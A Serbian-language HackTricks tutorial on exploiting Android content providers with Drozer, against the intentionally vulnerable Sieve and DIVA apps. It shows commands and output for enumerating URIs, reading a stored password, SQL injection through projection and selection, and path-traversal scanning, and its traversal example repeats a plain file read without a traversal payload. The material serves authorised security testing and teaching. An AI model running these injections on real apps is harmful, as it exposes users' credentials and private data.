# Exploiting Content Providers

## Iskorišćavanje provajdera sadržaja

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uvod

Podaci se **dostavljaju iz jedne aplikacije drugima** na zahtev putem komponente poznate kao **provajder sadržaja**. Ovi zahtevi se upravljaju putem metoda klase **ContentResolver**. Provajderi sadržaja mogu čuvati svoje podatke na različitim lokacijama, kao što su **baza podataka**, **fajlovi** ili preko **mreže**.

U _Manifest.xml_ fajlu je potrebno deklarisati provajdera sadržaja. Na primer:

```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```

Da biste pristupili `content://com.mwr.example.sieve.DBContentProvider/Keys`, potrebna je dozvola `READ_KEYS`. Zanimljivo je primetiti da je putanja `/Keys/` dostupna u sledećem odeljku, koji nije zaštićen zbog greške programera, koji je zaštitio `/Keys` ali je deklarisao `/Keys/`.

**Možda možete pristupiti privatnim podacima ili iskoristiti neku ranjivost (SQL Injection ili Path Traversal).**

## Dobijanje informacija iz **izloženih provajdera sadržaja**

```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```

Moguće je sastaviti kako bi se došlo do **DBContentProvider**-a počevši od URI-ja sa "_content://_". Ovaj pristup se zasniva na saznanjima dobijenim korišćenjem Drozera, gde su ključne informacije locirane u direktorijumu _/Keys_.

Drozer može **pokušati i isprobati nekoliko URI-ja**:

```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

Takođe, trebali biste proveriti **kod ContentProvider-a** da biste pretražili upite:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

Takođe, ako ne možete pronaći kompletne upite, možete **proveriti koja imena su deklarisana od strane ContentProvider-a** u metodi `onCreate`:

![](<../../../.gitbook/assets/image (186).png>)

Upit će biti oblika: `content://ime.paketa.klase/deklarisano_ime`

## **Content Provider-i sa podrškom za bazu podataka**

Verovatno se većina Content Provider-a koristi kao **interfejs** za **bazu podataka**. Stoga, ako mu možete pristupiti, možete izvući, ažurirati, ubaciti i obrisati informacije.\
Proverite da li možete **pristupiti osetljivim informacijama** ili pokušajte ih promeniti da biste **zaobišli mehanizme autorizacije**.

Pregledajte kod Content Provider-a i potražite i **funkcije** nazvane: _query, insert, update i delete_:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Jer ćete moći da ih pozovete.

### Upit sadržaja

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```

### Ubacivanje sadržaja

Upitom baze podataka saznaćete **ime kolona**, a zatim ćete moći da ubacite podatke u bazu:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Napomena: Prilikom ubacivanja i ažuriranja možete koristiti --string za string, --double za double, --float, --integer, --long, --short, --boolean_

### Ažuriranje sadržaja

Poznavajući ime kolona, takođe možete **izmeniti unose**:

![](<../../../.gitbook/assets/image (190).png>)

### Brisanje sadržaja

![](<../../../.gitbook/assets/image (191).png>)

### **SQL Injection**

Jednostavno je testirati SQL injection **(SQLite)** manipulacijom **projekcije** i **selekcije polja** koja se prosleđuju pružaocu sadržaja.\
Prilikom upita na pružaoca sadržaja postoje 2 interesantna argumenta za pretragu informacija: _--selection_ i _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

Možete pokušati da **zloupotrebite** ove **parametre** kako biste testirali SQL injection:

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```

**Automatsko otkrivanje SQLInjection napada pomoću Drozera**

Drozer je moćan alat za testiranje sigurnosti Android aplikacija koji omogućava automatsko otkrivanje ranjivosti SQLInjection. Ova tehnika omogućava napadaču da izvrši zlonamerni SQL kod na bazi podataka aplikacije, što može dovesti do neovlašćenog pristupa ili otkrivanja osetljivih informacija.

Da biste automatski otkrili SQLInjection ranjivosti pomoću Drozera, sledite sledeće korake:

1. Instalirajte Drozer na svom uređaju ili emulatoru.
2. Pokrenite Drozer i povežite se sa ciljnom aplikacijom.
3. Izvršite sledeću komandu da biste pronašli Content Providere u aplikaciji:

```
run app.provider.find
```

4. Pregledajte rezultate i pronađite Content Providere koji prihvataju korisnički unos.
5. Izvršite sledeću komandu da biste testirali ranjivost SQLInjection na odabranom Content Provideru:

```
run scanner.provider.injection --authority <authority> --uri <uri>
```

Zamenite `<authority>` sa autoritetom Content Providera i `<uri>` sa URI-om Content Providera koji želite da testirate.

Drozer će automatski testirati Content Provider za ranjivosti SQLInjection i prikazati rezultate. Ako se pronađe ranjivost, napadač može iskoristiti ovu ranjivost za izvršavanje zlonamernog SQL koda i dobijanje neovlašćenog pristupa ili otkrivanje osetljivih informacija.

Važno je napomenuti da je ova tehnika namenjena samo za testiranje sigurnosti i treba je koristiti samo sa dozvolom vlasnika aplikacije. Neovlašćeno korišćenje ove tehnike može biti protivzakonito i podleže pravnim sankcijama.

```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```

## **Content Provideri sa podrškom za sistem datoteka**

Content Provideri se takođe mogu koristiti za **pristupanje datotekama:**

![](<../../../.gitbook/assets/image (193).png>)

### Čitanje **datoteke**

Možete čitati datoteke iz Content Providera

```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```

### **Putanja Traversal**

Ako možete pristupiti datotekama, možete pokušati zloupotrijebiti putanju Traversal (u ovom slučaju to nije nužno, ali možete pokušati koristiti "_../_" i slične trikove).

```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```

**Automatsko otkrivanje putanje pretrage pomoću Drozera**

Drozer je moćan alat za testiranje sigurnosti Android aplikacija koji omogućava automatsko otkrivanje putanje pretrage. Ova tehnika se koristi za pronalaženje ranjivosti u Android aplikacijama koje koriste Content Provider komponente.

Kada se koristi Drozer, prvo se mora uspostaviti veza sa ciljnom aplikacijom. Zatim se koristi `run app.package.list` komanda kako bi se prikazao popis svih instaliranih aplikacija na uređaju. Nakon toga, koristi se `run app.provider.find` komanda kako bi se pronašle sve Content Provider komponente u ciljnoj aplikaciji.

Kada se pronađe Content Provider, koristi se `run app.provider.query` komanda kako bi se izvršio upit nad određenim Content Provider-om. Ova komanda omogućava testiranje različitih putanja pretrage kako bi se otkrile ranjivosti.

Drozer automatski testira različite putanje pretrage, uključujući `../`, `../../`, `../../../../` i tako dalje. Ako se pronađe putanja koja omogućava pristup osjetljivim podacima izvan granica aplikacije, to se smatra ranjivošću putanje pretrage.

Ova tehnika je vrlo korisna za otkrivanje ranjivosti u Android aplikacijama koje koriste Content Provider komponente. Drozer automatski testira različite putanje pretrage, čime olakšava proces otkrivanja ranjivosti i poboljšava sigurnost aplikacija.

```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```

## Reference

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
